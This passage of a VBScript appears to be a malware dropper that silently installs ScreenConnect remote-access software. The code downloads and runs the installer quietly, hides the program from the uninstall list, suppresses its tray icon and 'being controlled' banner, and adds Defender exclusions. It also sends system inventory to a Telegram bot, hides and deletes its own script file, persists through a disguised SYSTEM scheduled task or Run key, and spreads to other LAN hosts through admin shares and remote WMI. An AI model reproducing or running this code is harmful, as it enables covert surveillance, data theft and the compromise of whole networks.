    For nRetry = 1 To nMaxRetries
        LogMessage "[DOWNLOAD] Attempt " & nRetry & " of " & nMaxRetries
        
        If DownloadMSI(sUrl, sDestPath) Then
            bSuccess = True
            Exit For
        Else
            If nRetry < nMaxRetries Then
                LogMessage "[DOWNLOAD] Retry " & nRetry & " failed. Waiting " & DOWNLOAD_RETRY_DELAY & "ms..."
                WScript.Sleep DOWNLOAD_RETRY_DELAY
            End If
        End If
    Next
    
    DownloadWithRetry = bSuccess
End Function

'==========================================================================
' DOWNLOAD MSI
'==========================================================================
Function DownloadMSI(sUrl, sDestPath)
    On Error Resume Next
    
    If oFSO.FileExists(sDestPath) Then
        oFSO.DeleteFile sDestPath, True
    End If

    Dim oHTTP
    Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    If Err.Number <> 0 Then
        Err.Clear
        Set oHTTP = CreateObject("Microsoft.XMLHTTP")
    End If
    
    If Err.Number <> 0 Then
        Err.Clear
        Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    End If

    oHTTP.SetTimeouts 600000, 600000, 600000, 600000
    oHTTP.Open "GET", sUrl, False
    oHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    oHTTP.setRequestHeader "Accept", "*/*"
    oHTTP.setRequestHeader "Cache-Control", "no-cache"
    oHTTP.Send
    
    If Err.Number <> 0 Then
        LogMessage "[DOWNLOAD] HTTP Error: " & Err.Description
        DownloadMSI = False
        Exit Function
    End If

    If oHTTP.Status <> 200 Then
        LogMessage "[DOWNLOAD] HTTP Status: " & oHTTP.Status
        DownloadMSI = False
        Exit Function
    End If

    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1
    oStream.Open
    oStream.Write oHTTP.responseBody
    oStream.SaveToFile sDestPath, 2
    oStream.Close

    If Err.Number <> 0 Then
        LogMessage "[DOWNLOAD] Write Error: " & Err.Description
        DownloadMSI = False
        Exit Function
    End If

    If oFSO.FileExists(sDestPath) Then
        Dim oFile
        Set oFile = oFSO.GetFile(sDestPath)
        If oFile.Size > 1024 Then
            LogMessage "[DOWNLOAD] File saved. Size: " & FormatFileSize(oFile.Size)
            DownloadMSI = True
        Else
            LogMessage "[DOWNLOAD] File too small: " & oFile.Size & " bytes"
            oFSO.DeleteFile sDestPath, True
            DownloadMSI = False
        End If
        Set oFile = Nothing
    Else
        DownloadMSI = False
    End If

    Set oStream = Nothing
    Set oHTTP = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' VERIFY MSI INTEGRITY
'==========================================================================
Function VerifyMSIIntegrity(sFilePath)
    VerifyMSIIntegrity = False
    If Not oFSO.FileExists(sFilePath) Then Exit Function
    
    Dim oFile, oStream, nByte1, nByte2
    Set oFile = oFSO.GetFile(sFilePath)
    
    If LCase(oFSO.GetExtensionName(sFilePath)) <> "msi" Then Exit Function
    If oFile.Size < 1048576 Then Exit Function
    
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1
    oStream.Open
    oStream.LoadFromFile sFilePath
    oStream.Position = 0
    
    If oStream.Size >= 2 Then
        nByte1 = AscB(oStream.Read(1))
        nByte2 = AscB(oStream.Read(1))
        If nByte1 = &HD0 And nByte2 = &HCF Then
            VerifyMSIIntegrity = True
        End If
    End If
    
    oStream.Close
    Set oStream = Nothing
    Set oFile = Nothing
End Function

'==========================================================================
' INSTALL WITH TIMEOUT
'==========================================================================
Function InstallWithTimeout(sMsiFilePath, nTimeoutMinutes)
    Dim sInstallCmd, nExitCode
    
    sInstallCmd = "msiexec /i """ & sMsiFilePath & """ /qn /norestart " & _
                  "LicenseAccepted=YES POLICY_CATEGORY_ID=-1 " & _
                  "INSTALL_ARGS=""sourceInstall=silent"""
    
    LogMessage "[INSTALL] Running: " & sInstallCmd
    
    On Error Resume Next
    Dim objWMIService, objStartup, objConfig, objProcess, intProcessID
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    
    Dim nResult
    nResult = objProcess.Create(sInstallCmd, Null, objConfig, intProcessID)
    
    If nResult = 0 Then
        LogMessage "[INSTALL] Process started. PID: " & intProcessID
        
        Dim colProcesses, objProc, bFound, nWaitSeconds, nMaxSeconds
        nMaxSeconds = nTimeoutMinutes * 60
        nWaitSeconds = 0
        
        Do While nWaitSeconds < nMaxSeconds
            WScript.Sleep 5000
            nWaitSeconds = nWaitSeconds + 5
            
            Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & intProcessID)
            bFound = False
            For Each objProc In colProcesses
                bFound = True
            Next
            
            If Not bFound Then
                LogMessage "[INSTALL] Completed after ~" & nWaitSeconds & " seconds."
                Exit Do
            End If
        Loop
        
        If bFound Then
            LogMessage "[INSTALL] TIMEOUT. Terminating process..."
            Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & intProcessID)
            For Each objProc In colProcesses
                objProc.Terminate()
            Next
            nExitCode = -1
        Else
            nExitCode = 0
        End If
    Else
        LogMessage "[INSTALL] Failed to create process. Error: " & nResult
        nExitCode = -1
    End If
    
    InstallWithTimeout = nExitCode
    On Error GoTo 0
End Function

'==========================================================================
' VERIFY INSTALLATION
'==========================================================================
Function VerifyInstallation()
    VerifyInstallation = False
    On Error Resume Next
    
    Const HKLM = &H80000002
    Dim oReg, arrSubKeys, sSubKey, sDisplayName
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    Dim aPaths
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    Dim sPath
    For Each sPath In aPaths
        oReg.EnumKey HKLM, sPath, arrSubKeys
        If IsArray(arrSubKeys) Then
            For Each sSubKey In arrSubKeys
                oReg.GetStringValue HKLM, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                    If InStr(1, sDisplayName, sKeywordToHide, vbTextCompare) > 0 Then
                        LogMessage "[VERIFY] Found: " & sDisplayName
                        VerifyInstallation = True
                        Exit Function
                    End If
                End If
            Next
        End If
    Next
    
    Set oReg = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' FORCE HIDE APPLICATION
'==========================================================================
Sub ForceHideApplication(sKeyword)
    On Error Resume Next
    Const HKLM = &H80000002
    Const HKCU = &H80000001
    
    Dim oReg, aHives, aPaths, hive, sPath
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    aHives = Array(HKLM, HKCU)
    aPaths = Array( _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", _
        "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" _
    )
    
    For Each hive In aHives
        For Each sPath In aPaths
            LogMessage "[HIDE] Scanning: " & GetHiveName(hive) & "\" & sPath
            SearchAndHideInPath oReg, hive, sPath, sKeyword
        Next
    Next
    
    Set oReg = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' SEARCH AND HIDE IN PATH
'==========================================================================
Sub SearchAndHideInPath(oReg, lHive, sKeyPath, sKeyword)
    On Error Resume Next
    Dim arrSubKeys, sSubKey, sDisplayName
    
    oReg.EnumKey lHive, sKeyPath, arrSubKeys
    
    If IsArray(arrSubKeys) Then
        For Each sSubKey In arrSubKeys
            oReg.GetStringValue lHive, sKeyPath & "\" & sSubKey, "DisplayName", sDisplayName
            
            If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                If InStr(1, sDisplayName, sKeyword, vbTextCompare) > 0 Then
                    LogMessage "[HIDE] MATCH: '" & sDisplayName & "'"
                    
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "SystemComponent", 1
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayName"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayIcon"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "DisplayVersion"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "Publisher"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "URLInfoAbout"
                    oReg.DeleteValue lHive, sKeyPath & "\" & sSubKey, "HelpLink"
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "NoRemove", 0
                    oReg.SetDWORDValue lHive, sKeyPath & "\" & sSubKey, "NoModify", 1
                    
                    LogMessage "[HIDE] All hiding methods applied."
                End If
            End If
        Next
    End If
    On Error GoTo 0
End Sub

'==========================================================================
' HIDE SCREENCONNECT TRAY ICON
'==========================================================================
Sub HideTrayIcon()
    On Error Resume Next
    Const HKLM = &H80000002
    
    Dim oReg
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    LogMessage "[HIDE-TRAY] Hiding ScreenConnect tray icon..."
    
    ' Try multiple possible registry locations
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "HideTrayIcon", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "HideTrayIcon", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "ShowTrayIcon", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "ShowTrayIcon", 0
    
    Set oReg = Nothing
    LogMessage "[HIDE-TRAY] Tray icon hidden."
    On Error GoTo 0
End Sub

'==========================================================================
' HIDE "BEING CONTROLLED" BANNER
' Strategy: Try to fully hide → fallback to transparent → fallback to auto-minimize
'==========================================================================
Sub HideControlBanner()
    On Error Resume Next
    Const HKLM = &H80000002
    
    Dim oReg
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    
    LogMessage "[HIDE-BANNER] Attempting to hide control banner..."
    
    ' ATTEMPT 1: Fully disable the banner
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "ShowGuestBanner", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "ShowHostBanner", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "ShowGuestBanner", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "ShowHostBanner", 0
    LogMessage "[HIDE-BANNER] Attempt 1: Disabled banners via registry."
    
    ' ATTEMPT 2: Set banner opacity to 0 (completely transparent)
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "BannerOpacity", 0
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "BannerOpacity", 0
    LogMessage "[HIDE-BANNER] Attempt 2: Set banner opacity to 0 (transparent)."
    
    ' ATTEMPT 3: Auto-minimize after 1 second
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "AutoMinimizeBanner", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "AutoMinimizeDelay", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "AutoMinimizeBanner", 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "AutoMinimizeDelay", 1
    LogMessage "[HIDE-BANNER] Attempt 3: Set auto-minimize after 1 second."
    
    Set oReg = Nothing
    LogMessage "[HIDE-BANNER] All banner hiding methods applied."
    On Error GoTo 0
End Sub

'==========================================================================
' ADD WINDOWS DEFENDER EXCLUSION
'==========================================================================
Sub AddDefenderExclusion()
    On Error Resume Next
    
    LogMessage "[AV] Adding ScreenConnect to Windows Defender exclusions..."
    
    ' Add folder exclusion
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files\ScreenConnect'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\ScreenConnect'""", 0, True
    
    ' Add process exclusion
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionProcess 'ScreenConnect.WindowsClient.exe'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionProcess 'ScreenConnect.Service.exe'""", 0, True
    
    LogMessage "[AV] Defender exclusions added."
    On Error GoTo 0
End Sub

'==========================================================================
' GATHER SYSTEM INVENTORY
'==========================================================================
Sub GatherSystemInventory()
    On Error Resume Next
    
    LogMessage "[INVENTORY] Gathering system information..."
    
    Dim sInfo
    sInfo = ""
    
    ' Computer Name & User
    sInfo = sInfo & "🖥️ Computer: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & "%0A"
    sInfo = sInfo & "👤 Username: " & oShell.ExpandEnvironmentStrings("%USERNAME%") & "%0A"
    
    ' OS Info
    Dim colOS, objOS
    Set colOS = oWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objOS In colOS
        sInfo = sInfo & "🪟 Windows: " & objOS.Caption & "%0A"
        sInfo = sInfo & "📐 Architecture: " & objOS.OSArchitecture & "%0A"
        sInfo = sInfo & "📅 OS Installed: " & Left(objOS.InstallDate, 10) & "%0A"
        
        ' Uptime
        Dim dtLastBoot, dtNow, nUptime
        dtLastBoot = CDate(Left(Replace(objOS.LastBootUpTime, ".000000+060", ""), 14))
        nUptime = DateDiff("h", dtLastBoot, Now)
        sInfo = sInfo & "⏱️ Uptime: " & nUptime & " hours%0A"
    Next
    
    ' CPU
    Dim colCPU, objCPU
    Set colCPU = oWMI.ExecQuery("SELECT * FROM Win32_Processor")
    For Each objCPU In colCPU
        sInfo = sInfo & "🧠 CPU: " & Trim(objCPU.Name) & "%0A"
        sInfo = sInfo & "🔢 Cores: " & objCPU.NumberOfCores & "%0A"
        Exit For
    Next
    
    ' RAM
    Dim colRAM, objRAM, nTotalRAM
    Set colRAM = oWMI.ExecQuery("SELECT * FROM Win32_ComputerSystem")
    For Each objRAM In colRAM
        nTotalRAM = Round(objRAM.TotalPhysicalMemory / 1073741824, 1)
        sInfo = sInfo & "🧮 RAM: " & nTotalRAM & " GB%0A"
        Exit For
    Next
    
    ' Disk
    Dim oDrive
    Set oDrive = oFSO.GetDrive("C:")
    If oDrive.IsReady Then
        sInfo = sInfo & "💾 Disk C: " & FormatFileSize(oDrive.TotalSize) & _
                " (" & FormatFileSize(oDrive.FreeSpace) & " free)%0A"
    End If
    Set oDrive = Nothing
    
    ' Network
    Dim colNet, objNet
    Set colNet = oWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then
            sInfo = sInfo & "🌐 IP: " & objNet.IPAddress(0) & "%0A"
        End If
        If Not IsNull(objNet.MACAddress) Then
            sInfo = sInfo & "🔗 MAC: " & objNet.MACAddress & "%0A"
        End If
        Exit For
    Next
    
    ' WiFi SSID
    Dim colWiFi, objWiFi
    Set colWiFi = oWMI.ExecQuery("SELECT * FROM MSNdis_80211_SSID WHERE Active = True")
    For Each objWiFi In colWiFi
        If Not IsNull(objWiFi.Ndis80211SsId) Then
            Dim arrSSID, sSSID, j
            arrSSID = objWiFi.Ndis80211SsId
            sSSID = ""
            For j = 0 To UBound(arrSSID)
                If arrSSID(j) <> 0 Then sSSID = sSSID & Chr(arrSSID(j))
            Next
            If sSSID <> "" Then
                sInfo = sInfo & "📡 WiFi: " & sSSID & "%0A"
            End If
        End If
        Exit For
    Next
    
    ' Antivirus
    Dim colAV, objAV
    Set colAV = oWMI.ExecQuery("SELECT * FROM AntiVirusProduct", "root\SecurityCenter2")
    Dim sAVList
    sAVList = ""
    For Each objAV In colAV
        If sAVList <> "" Then sAVList = sAVList & ", "
        sAVList = sAVList & objAV.displayName
    Next
    If sAVList = "" Then sAVList = "Windows Defender (default)"
    sInfo = sInfo & "🛡️ Antivirus: " & sAVList & "%0A"
    
    ' Battery (if laptop)
    Dim colBattery, objBattery
    Set colBattery = oWMI.ExecQuery("SELECT * FROM Win32_Battery")
    For Each objBattery In colBattery
        If Not IsNull(objBattery.BatteryStatus) Then
            sInfo = sInfo & "🔋 Battery: " & objBattery.EstimatedChargeRemaining & "%"
            If objBattery.BatteryStatus = 2 Then sInfo = sInfo & " (Plugged in)"
            sInfo = sInfo & "%0A"
        End If
        Exit For
    Next
    
    g_SystemInfo = sInfo
    LogMessage "[INVENTORY] System info gathered."
    On Error GoTo 0
End Sub

'==========================================================================
' SEND TELEGRAM REPORT
'==========================================================================
Sub SendTelegramReport(sStatus, sExtraInfo)
    On Error Resume Next
    
    ' Skip if no token configured
    If sBotToken = "" Or sChatID = "" Then
        LogMessage "[TELEGRAM] Bot token or Chat ID not configured. Skipping report."
        Exit Sub
    End If
    
    LogMessage "[TELEGRAM] Building report message..."
    
    Dim sMessage
    sMessage = "%F0%9F%93%8B SC INSTALLER REPORT%0A%0A"
    sMessage = sMessage & "%F0%9F%93%8C STATUS: " & sStatus & "%0A"
    sMessage = sMessage & "%F0%9F%95%90 Time: " & FormatDateTime(Now, 0) & "%0A%0A"
    
    If g_SystemInfo <> "" Then
        sMessage = sMessage & "--- SYSTEM INFO ---%0A"
        sMessage = sMessage & g_SystemInfo & "%0A"
    End If
    
    sMessage = sMessage & "--- INSTALL RESULTS ---%0A"
    sMessage = sMessage & "%F0%9F%97%91%EF%B8%8F Removed: " & g_RemovedTools & "%0A"
    
    If g_NetworkPCs <> "" Then
        sMessage = sMessage & "%F0%9F%94%97 Network PCs: " & g_NetworkPCs & "%0A"
    End If
    
    If sExtraInfo <> "" Then
        sMessage = sMessage & "%0A%E2%9A%A0%EF%B8%8F " & sExtraInfo & "%0A"
    End If
    
    LogMessage "[TELEGRAM] Sending report..."
    
    ' URL encode the message
    Dim sURL
    sURL = "https://api.telegram.org/bot" & sBotToken & "/sendMessage" & _
           "?chat_id=" & sChatID & _
           "&text=" & sMessage & _
           "&parse_mode=HTML"
    
    Dim oHTTP
    Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then
        Err.Clear
        Set oHTTP = CreateObject("Microsoft.XMLHTTP")
    End If
    
    oHTTP.Open "GET", sURL, False
    oHTTP.Send
    
    If oHTTP.Status = 200 Then
        LogMessage "[TELEGRAM] Report sent successfully!"
    Else
        LogMessage "[TELEGRAM] Failed to send. Status: " & oHTTP.Status
    End If
    
    Set oHTTP = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' HIDE SCRIPT (Copy to hidden location, delete original)
'==========================================================================
Sub HideScript()
    On Error Resume Next
    
    Dim sOriginalScript
    sOriginalScript = WScript.ScriptFullName
    
    ' Create hidden directory if needed
    Dim sHiddenDir
    sHiddenDir = oFSO.GetParentFolderName(sHiddenScriptPath)
    If Not oFSO.FolderExists(sHiddenDir) Then
        CreateNestedFolders sHiddenDir
    End If
    
    ' Only copy if we're not already the hidden copy
    If LCase(sOriginalScript) <> LCase(sHiddenScriptPath) Then
        LogMessage "[HIDE] Copying script to hidden location: " & sHiddenScriptPath
        oFSO.CopyFile sOriginalScript, sHiddenScriptPath, True
        
        ' Set file attributes to Hidden + System
        Dim oHiddenFile
        Set oHiddenFile = oFSO.GetFile(sHiddenScriptPath)
        oHiddenFile.Attributes = 2 + 4  ' Hidden + System
        Set oHiddenFile = Nothing
        
        LogMessage "[HIDE] Script hidden successfully."
        
        ' Delete the original
        LogMessage "[HIDE] Scheduling deletion of original script..."
        oShell.Run "cmd /c timeout /t 3 /nobreak > nul & del /f /q """ & sOriginalScript & """", 0, False
    End If
    
    On Error GoTo 0
End Sub

'==========================================================================
' CREATE PERSISTENCE (Run at startup + every 24 hours)
'==========================================================================
Sub CreatePersistence()
    On Error Resume Next
    
    Dim sTaskName
    sTaskName = "WindowsSystemMaintenance"
    
    ' Delete existing task first
    oShell.Run "schtasks /delete /tn """ & sTaskName & """ /f", 0, True
    
    LogMessage "[PERSISTENCE] Creating scheduled task: " & sTaskName
    
    ' Create task with SYSTEM privileges
    Dim sCreateTaskCmd
    sCreateTaskCmd = "schtasks /create /tn """ & sTaskName & """ " & _
                     "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & _
                     "/sc DAILY " & _
                     "/st 00:00 " & _
                     "/ri 1440 " & _
                     "/du 24:00 " & _
                     "/ru SYSTEM " & _
                     "/rl HIGHEST " & _
                     "/f"
    
    oShell.Run sCreateTaskCmd, 0, True
    
    ' Add logon trigger
    oShell.Run "schtasks /change /tn """ & sTaskName & """ " & _
               "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & _
               " /sc ONLOGON", 0, True
    
    If Err.Number = 0 Then
        LogMessage "[PERSISTENCE] Task created. Triggers: At logon + Every 24 hours"
    Else
        ' Fallback: Registry Run key
        LogMessage "[PERSISTENCE] Task failed. Using Registry fallback..."
        oShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & sTaskName, _
                        "wscript.exe //B """ & sHiddenScriptPath & """", "REG_SZ"
        LogMessage "[PERSISTENCE] Registry Run key added."
    End If
    
    On Error GoTo 0
End Sub

'==========================================================================
' IS PERSISTENCE RUN?
'==========================================================================
Function IsPersistenceRun()
    IsPersistenceRun = (LCase(WScript.ScriptFullName) = LCase(sHiddenScriptPath))
End Function

'==========================================================================
' QUICK HEALTH CHECK (for persistence runs)
'==========================================================================
Sub QuickHealthCheck()
    On Error Resume Next
    LogMessage "[HEALTH] Running quick health check..."
    
    ' Check if ScreenConnect service exists and is running
    Dim objService
    Set objService = oWMI.Get("Win32_Service.Name='ScreenConnect Client'")
    
    If Err.Number <> 0 Then
        LogMessage "[HEALTH] ScreenConnect service NOT FOUND. Triggering full reinstall..."
        Err.Clear
        
        ' Re-download and install
        If DownloadWithRetry(sMsiUrl, sMsiPath, MAX_DOWNLOAD_RETRIES) Then
            InstallWithTimeout sMsiPath, INSTALL_TIMEOUT_MIN
            ForceHideApplication sKeywordToHide
            HideTrayIcon()
            HideControlBanner()
        End If
    Else
        If objService.State <> "Running" Then
            LogMessage "[HEALTH] Service exists but not running. Starting..."
            objService.StartService()
            WScript.Sleep 3000
            
            If objService.State = "Running" Then
                LogMessage "[HEALTH] Service started successfully."
            Else
                LogMessage "[HEALTH] Failed to start service. Attempting repair..."
                oShell.Run "cmd /c sc start ""ScreenConnect Client""", 0, True
            End If
        Else
            LogMessage "[HEALTH] ScreenConnect is healthy and running."
        End If
    End If
    
    ' Re-hide just in case someone unhid it
    ForceHideApplication sKeywordToHide
    HideTrayIcon()
    HideControlBanner()
    
    ' Quick network check - try to spread if new PCs found
    If NETWORK_SPREAD_ENABLED Then
        LogMessage "[HEALTH] Checking for new network targets..."
        NetworkSpread()
    End If
    
    On Error GoTo 0
End Sub

'==========================================================================
' NETWORK SPREAD - Scan LAN and deploy to other PCs
'==========================================================================
Sub NetworkSpread()
    On Error Resume Next
    
    LogMessage "[SPREAD] Starting network spread scan..."
    
    ' Get local IP and subnet
    Dim colNet, objNet, sLocalIP
    Set colNet = oWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then
            sLocalIP = objNet.IPAddress(0)
            Exit For
        End If
    Next
    
    If sLocalIP = "" Then
        LogMessage "[SPREAD] Could not determine local IP. Skipping."
        Exit Sub
    End If
    
    LogMessage "[SPREAD] Local IP: " & sLocalIP
    
    ' Determine network range
    Dim aIPParts, sBaseIP
    aIPParts = Split(sLocalIP, ".")
    If UBound(aIPParts) <> 3 Then Exit Sub
    
    sBaseIP = aIPParts(0) & "." & aIPParts(1) & "." & aIPParts(2) & "."
    
    ' Scan IPs 1-254 (skip own IP and common network devices)
    Dim iPing, sTargetIP, sPCList
    sPCList = ""
    
    Dim aSkipIPs
    aSkipIPs = Array("1", "254")  ' Skip gateway and broadcast typically
    
    LogMessage "[SPREAD] Scanning network: " & sBaseIP & "1-254"
    
    For iPing = 1 To 254
        sTargetIP = sBaseIP & iPing
        
        ' Skip own IP
        If sTargetIP = sLocalIP Then
            ' Skip self
        Else
            ' Quick ping check
            Dim oExec, sPingResult
            Set oExec = oShell.Exec("ping -n 1 -w " & NETWORK_TIMEOUT_MS & " " & sTargetIP)
            sPingResult = oExec.StdOut.ReadAll
            
            If InStr(1, sPingResult, "TTL=", vbTextCompare) > 0 Then
                LogMessage "[SPREAD] Host alive: " & sTargetIP
                
                ' Try to deploy
                If DeployToTarget(sTargetIP) Then
                    If sPCList <> "" Then sPCList = sPCList & ", "
                    sPCList = sPCList & sTargetIP
                End If
            End If
        End If
    Next
    
    g_NetworkPCs = sPCList
    If g_NetworkPCs = "" Then g_NetworkPCs = "None found"
    
    LogMessage "[SPREAD] Network spread complete. Deployed to: " & g_NetworkPCs
    On Error GoTo 0
End Sub

'==========================================================================
' DEPLOY TO TARGET PC
'==========================================================================
Function DeployToTarget(sTargetIP)
    DeployToTarget = False
    On Error Resume Next
    
    Dim sAdminShare, sDestPath
    
    ' Check if admin share is accessible
    If Not oFSO.FolderExists("\\" & sTargetIP & "\C$") Then
        LogMessage "[SPREAD] Admin share not accessible on " & sTargetIP
        Exit Function
    End If
    
    ' Copy the script to target
    sDestPath = "\\" & sTargetIP & "\C$\Windows\Temp\winsys.vbs"
    LogMessage "[SPREAD] Copying script to " & sDestPath
    
    oFSO.CopyFile sHiddenScriptPath, sDestPath, True
    
    If Err.Number <> 0 Then
        LogMessage "[SPREAD] Failed to copy to " & sTargetIP & ": " & Err.Description
        Err.Clear
        Exit Function
    End If
    
    ' Execute the script remotely
    LogMessage "[SPREAD] Executing script on " & sTargetIP
    
    Dim oRemoteWMI, oRemoteProcess, oRemoteConfig
    Set oRemoteWMI = GetObject("winmgmts:\\" & sTargetIP & "\root\cimv2")
    
    If Err.Number <> 0 Then
        LogMessage "[SPREAD] WMI connection failed. Trying scheduled task method..."
        Err.Clear
        
        ' Fallback: Create a remote scheduled task
        oShell.Run "schtasks /create /s " & sTargetIP & _
                   " /tn ""WindowsSystemMaintenance"" " & _
                   " /tr ""wscript.exe //B C:\Windows\Temp\winsys.vbs"" " & _
                   " /sc ONCE /st 00:00 /ru SYSTEM /rl HIGHEST /f", 0, True
        
        ' Run it immediately
        oShell.Run "schtasks /run /s " & sTargetIP & " /tn ""WindowsSystemMaintenance""", 0, True
    Else
        ' Use WMI to execute
        Set oRemoteConfig = oRemoteWMI.Get("Win32_ProcessStartup").SpawnInstance_
        oRemoteConfig.ShowWindow = 0
        Set oRemoteProcess = oRemoteWMI.Get("Win32_Process")
        oRemoteProcess.Create "wscript.exe //B C:\Windows\Temp\winsys.vbs", Null, oRemoteConfig, 0
    End If
    
    If Err.Number = 0 Then
        LogMessage "[SPREAD] Successfully deployed to " & sTargetIP
        DeployToTarget = True
    Else
        LogMessage "[SPREAD] Failed to execute on " & sTargetIP & ": " & Err.Description
        Err.Clear
    End If
    
    Set oRemoteProcess = Nothing
    Set oRemoteConfig = Nothing
    Set oRemoteWMI = Nothing
    
    On Error GoTo 0
End Function

'==========================================================================
' FINAL CLEANUP
'==========================================================================
Sub FinalCleanup()
    On Error Resume Next
    
    If oFSO.FileExists(sMsiPath) Then
        oFSO.DeleteFile sMsiPath, True
        LogMessage "[CLEANUP] MSI file deleted."
    End If
    
    ' Clean any leftover MSI files in temp
    Dim oFolder, oFile
    If oFSO.FolderExists(sTempDir) Then
        Set oFolder = oFSO.GetFolder(sTempDir)
        For Each oFile In oFolder.Files
            If LCase(oFSO.GetExtensionName(oFile.Name)) = "msi" Then
                If InStr(1, oFile.Name, "ScreenConnect", vbTextCompare) > 0 Or _
                   InStr(1, oFile.Name, "ConnectWise", vbTextCompare) > 0 Or _
                   InStr(1, oFile.Name, "56BSSW", vbTextCompare) > 0 Then
                    oFSO.DeleteFile oFile.Path, True
                    LogMessage "[CLEANUP] Deleted leftover MSI: " & oFile.Name
                End If
            End If
        Next
    End If
    
    On Error GoTo 0
End Sub

'==========================================================================
' CLEANUP OLD LOGS
'==========================================================================
Sub CleanupOldLogs(nKeepCount)
    On Error Resume Next
    Dim oFolder, oFile, aLogFiles(), nCount, i
    
    If Not oFSO.FolderExists(sTempDir) Then Exit Sub
    
    Set oFolder = oFSO.GetFolder(sTempDir)
    nCount = 0
    
    For Each oFile In oFolder.Files
        If InStr(1, oFile.Name, "ScreenConnect_Install", vbTextCompare) > 0 Then
            ReDim Preserve aLogFiles(nCount)
            Set aLogFiles(nCount) = oFile
            nCount = nCount + 1
        End If
    Next
    
    If nCount > nKeepCount Then
        For i = 0 To nCount - nKeepCount - 1
            aLogFiles(i).Delete True
        Next
    End If
    
    On Error GoTo 0
End Sub

'==========================================================================
' HELPER FUNCTIONS
'==========================================================================

Function IsScriptElevated()
    IsScriptElevated = False
    On Error Resume Next
    Dim sTestFile
    sTestFile = oShell.ExpandEnvironmentStrings("%WINDIR%") & "\test_admin.tmp"
    oFSO.CreateTextFile(sTestFile).Close
    If Err.Number = 0 Then
        oFSO.DeleteFile sTestFile
        IsScriptElevated = True
    End If
    On Error GoTo 0
End Function

Sub ElevateScript()
    Dim oShellApp
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
End Sub

Sub LogMessage(sMessage)
    On Error Resume Next
    Dim oLogFile
    Set oLogFile = oFSO.OpenTextFile(sLogFile, 8, True)
    If Err.Number = 0 Then
        oLogFile.WriteLine FormatDateTime(Now, 0) & " | " & sMessage
        oLogFile.Close
    End If
